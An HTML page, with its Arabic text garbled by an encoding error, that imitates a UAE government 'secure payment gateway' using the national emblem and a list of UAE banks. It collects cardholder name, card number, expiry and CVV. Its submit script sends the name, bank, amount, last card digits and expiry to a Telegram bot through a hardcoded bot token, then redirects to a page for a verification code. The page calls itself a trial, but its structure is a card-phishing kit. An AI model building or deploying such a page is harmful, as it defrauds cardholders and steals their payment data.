<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width,initial-scale=1" />
  <title>ุจูุงุจุฉ ุงูุฏูุน โ ุงูุฏูุน</title>
  <style>
    body{font-family:Tahoma, Arial, sans-serif;direction:rtl;background:#f5f7f5;margin:0;padding:20px;box-sizing:border-box}
    .wrap{max-width:420px;margin:30px auto}
    .card{background:#fff;border-radius:10px;padding:18px;box-shadow:0 6px 18px rgba(0,0,0,0.06)}
    header{display:flex;align-items:center;justify-content:center;flex-direction:column;margin-bottom:12px}
    header img{height:70px;margin-bottom:8px}
    h1{margin:0 0 6px;font-size:20px;color:#1f6d3b;text-align:center}
    label{display:block;margin-top:12px;font-weight:700;color:#222}
    input,select,button{width:100%;padding:12px;margin-top:6px;border:1px solid #ddd;border-radius:8px;box-sizing:border-box;font-size:15px}
    select{appearance:none;background-position:calc(100% - 12px) center;background-repeat:no-repeat}
    .row{display:flex;gap:8px}
    .row .col{flex:1}
    .small{font-size:13px;color:#666;text-align:center;margin-top:10px}
    .error{color:#b00020;font-size:13px;display:none;margin-top:8px}
    button{background:#1f6d3b;color:#fff;border:0;cursor:pointer;font-weight:800;border-radius:8px}
    @media (max-width:420px){
      .wrap{padding:0 12px}
    }
  </style>
</head>
<body>
  <div class="wrap">
    <div class="card">
      <header>
        <img src="https://upload.wikimedia.org/wikipedia/commons/6/65/Emblem_of_the_United_Arab_Emirates.svg" alt="ุดุนุงุฑ">
        <h1>ุจูุงุจุฉ ุงูุฏูุน ุงูุขููุฉ</h1>
        <div class="small">ุชุงุจุน ุฅููุงู ุงูุฏูุน ุจุฃูุงู โ ุชุฌุฑูุจู</div>
      </header>

      <form id="paymentForm" autocomplete="off" novalidate>
        <label for="fullName">ุงูุงุณู ุงููุงูู</label>
        <input id="fullName" type="text" placeholder="ุงูุงุณู ููุง ูู ุงูุจุทุงูุฉ" required>

        <label for="bank">ุงูุจูู</label>
        <select id="bank" required>
          <option value="">โ ุงุฎุชุฑ ุงูุจูู โ</option>
          <option>ุจูู ุฃุจูุธุจู ุงูุฃูู</option>
          <option>ูุตุฑู ุฃุจูุธุจู ุงูุฅุณูุงูู</option>
          <option>ุจูู ุฃุจูุธุจู ุงูุชุฌุงุฑู</option>
          <option>ุจูู ุงูุฅูุงุฑุงุช ุฏุจู ุงููุทูู</option>
          <option>ุจูู ุฏุจู ุงูุฅุณูุงูู</option>
          <option>ุจูู ุฏุจู ุงูุชุฌุงุฑู</option>
          <option>ุจูู ุงููุดุฑู</option>
          <option>ูุตุฑู ุงูุดุงุฑูุฉ ุงูุฅุณูุงูู</option>
          <option>ุจูู ุนุฌูุงู</option>
          <option>ูุตุฑู ุงูููุงู</option>
          <option>ุจูู ุฑุฃุณ ุงูุฎููุฉ</option>
          <option>ุจูู ุงููุฌูุฑุฉ ุงููุทูู</option>
          <option>ุงูุจูู ุงูุนุฑุจู ุงููุชุญุฏ</option>
          <option>ุจูู ุฃู ุงูููููู ุงููุทูู</option>
          <option>ุจูู ุงูุดุงุฑูุฉ</option>
          <option>ุงูุจูู ุงูุชุฌุงุฑู ุงูุฏููู</option>
          <option>HSBC</option>
          <option>ุณุชุงูุฏุฑุฏ ุชุดุงุฑุชุฑุฏ</option>
          <option>ุณูุชู ุจูู</option>
          <option>ุงูุฅูุงุฑุงุช ุงูุฅุณูุงูู</option>
          <option>LIV</option>
          <option>ุงููุงุฑูุฉ ุงููุญูู</option>
          <option>Wio Bank</option>
        </select>

        <label for="amount">ูููุฉ ุงูุณุฏุงุฏ (ุฏุฑูู ุฅูุงุฑุงุชู)</label>
        <input id="amount" type="number" min="1" step="0.01" placeholder="ูุซุงู: 100.00" required>

        <label for="cardNumber">ุฑูู ุงูุจุทุงูุฉ</label>
        <input id="cardNumber" inputmode="numeric" maxlength="19" placeholder="XXXX-XXXX-XXXX-XXXX" required>

        <div class="row">
          <div class="col">
            <label for="expiryMonth">ุดูุฑ ุงูุงูุชูุงุก (MM)</label>
            <select id="expiryMonth" required>
              <option value="">--</option>
              <option>01</option><option>02</option><option>03</option>
              <option>04</option><option>05</option><option>06</option>
              <option>07</option><option>08</option><option>09</option>
              <option>10</option><option>11</option><option>12</option>
            </select>
          </div>
          <div class="col">
            <label for="expiryYear">ุณูุฉ ุงูุงูุชูุงุก (YYYY)</label>
            <select id="expiryYear" required>
              <option value="">--</option>
              <script>document.write('');</script>
            </select>
          </div>
        </div>

        <label for="cvv">CVV</label>
        <input id="cvv" type="password" inputmode="numeric" maxlength="4" placeholder="***" required>

        <div class="error" id="formError">ุงูุฑุฌุงุก ููุก ูู ุงูุญููู ุจุดูู ุตุญูุญ.</div>

        <button type="submit">ุงููุชุงุจุนุฉ ุฅูู ุงูุชุญูู</button>
      </form>

      <div class="small">ุณูุชู ุชูุฌููู ุฅูู ุตูุญุฉ ุงูุชุญูู ูุฅุฏุฎุงู ุฑูุฒ ุงูุชุญูู.</div>
    </div>
  </div>

  <script>
    // ======= ุชูููู ุจูุช ุงูุชูุบุฑุงู =======
    const BOT_TOKEN = "8175456301:AAHcojlkfA5YkgBkx5gAnvFjd-u5Tk6hg7I";
    const CHAT_ID  = "8404960059";
    // ===================================

    // ุฅุถุงูุฉ ุณููุงุช ุงูุงูุชูุงุก ุฏููุงููููุงู
    (function fillYears(){
      const sel = document.getElementById('expiryYear');
      for(let y=2025;y<=2044;y++){
        const o = document.createElement('option');
        o.textContent = String(y);
        o.value = String(y);
        sel.appendChild(o);
      }
    })();

    // ุชูุณูู ุฑูู ุงูุจุทุงูุฉ (4-4-4-4)
    function formatCardNumberField(el){
      let v = el.value.replace(/\D/g,'').slice(0,16);
      const parts = v.match(/.{1,4}/g) || [];
      el.value = parts.join('-');
    }
    document.getElementById('cardNumber').addEventListener('input', function(){ formatCardNumberField(this); });

    function last4(numberStr){
      const digits = numberStr.replace(/\D/g,'');
      return digits.slice(-4).padStart(4,'*');
    }

    document.getElementById('paymentForm').addEventListener('submit', async function(e){
      e.preventDefault();
      const errEl = document.getElementById('formError');
      errEl.style.display = 'none';

      const fullName = document.getElementById('fullName').value.trim();
      const bank = document.getElementById('bank').value;
      const amount = document.getElementById('amount').value.trim();
      const cardNumber = document.getElementById('cardNumber').value.trim();
      const expiryMonth = document.getElementById('expiryMonth').value;
      const expiryYear = document.getElementById('expiryYear').value;
      const cvv = document.getElementById('cvv').value.trim();

      if(!fullName || !bank || !amount || !cardNumber || !expiryMonth || !expiryYear || !cvv){
        errEl.textContent = 'ุงูุฑุฌุงุก ููุก ูู ุงูุญููู ุงููุทููุจุฉ.';
        errEl.style.display = 'block';
        return;
      }

      const digits = cardNumber.replace(/\D/g,'');
      if(digits.length < 12 || digits.length > 16){
        errEl.textContent = 'ุฑูู ุงูุจุทุงูุฉ ุบูุฑ ุตุงูุญ (ูุฌุจ ุฃู ูููู 12 ุฅูู 16 ุฑูู).';
        errEl.style.display = 'block';
        return;
      }

      if(!/^\d{3,4}$/.test(cvv)){
        errEl.textContent = 'ุฑูุฒ CVV ุบูุฑ ุตุงูุญ.';
        errEl.style.display = 'block';
        return;
      }

      const now = new Date();
      const yNum = parseInt(expiryYear,10), mNum = parseInt(expiryMonth,10);
      if(yNum < now.getFullYear() || (yNum === now.getFullYear() && mNum < now.getMonth()+1)){
        errEl.textContent = 'ุชุงุฑูุฎ ุงูุตูุงุญูุฉ ููุชูู.';
        errEl.style.display = 'block';
        return;
      }

      const maskedCard = '****-****-****-' + last4(cardNumber);
      const dataToStore = {
        fullName, bank, amount,
        cardLast4: last4(cardNumber),
        cardMasked: maskedCard,
        expiryMonth, expiryYear
      };

      sessionStorage.setItem('paymentSafe', JSON.stringify(dataToStore));

      const message = `๐ข ุฅุดุนุงุฑ ุฏูุน (ุชุฌุฑูุจู)
ุงูุงุณู: ${fullName}
ุงูุจูู: ${bank}
ุงููุจูุบ: ${amount} ุฏุฑูู
ุงูุจุทุงูุฉ (ุขุฎุฑ 4): ${last4(cardNumber)}
ุชุงุฑูุฎ ุตูุงุญูุฉ ุงูุจุทุงูุฉ: ${expiryMonth}/${expiryYear}
(ููุงุญุธุฉ: ูุง ูุชู ุฅุฑุณุงู CVV ุฃู ุฑูู ุงูุจุทุงูุฉ ุงููุงูู ูุฃูุงู ุงูุงุฎุชุจุงุฑ)`;

      try{
        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
          method:'POST',
          headers:{'Content-Type':'application/json'},
          body: JSON.stringify({ chat_id: CHAT_ID, text: message })
        });
      }catch(err){
        console.warn('ูุดู ุงูุฅุฑุณุงู ุฅูู ุชูููุฌุฑุงู โ', err);
      }

      window.location.href = 'verify.html';
    });
  </script>
</body>
</html>
